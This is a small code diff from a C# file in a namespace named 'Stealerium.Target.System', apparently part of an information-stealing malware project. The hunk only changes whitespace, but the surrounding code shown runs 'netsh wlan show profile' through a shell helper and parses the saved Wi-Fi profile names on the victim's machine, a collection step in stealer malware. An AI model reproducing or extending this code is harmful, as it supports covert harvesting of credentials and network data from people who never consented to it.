@@ -11,7 +11,7 @@ namespace Stealerium.Target.System
         private static string[] GetProfiles()
         {
             var output = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All");
-            var wNames = output.Split(new[] {'\r', '\n'}, StringSplitOptions.RemoveEmptyEntries);
+            var wNames = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
             for (var i = 0; i < wNames.Length; i++)
                 wNames[i] = wNames[i].Substring(wNames[i].LastIndexOf(':') + 1).Trim();
             return wNames;
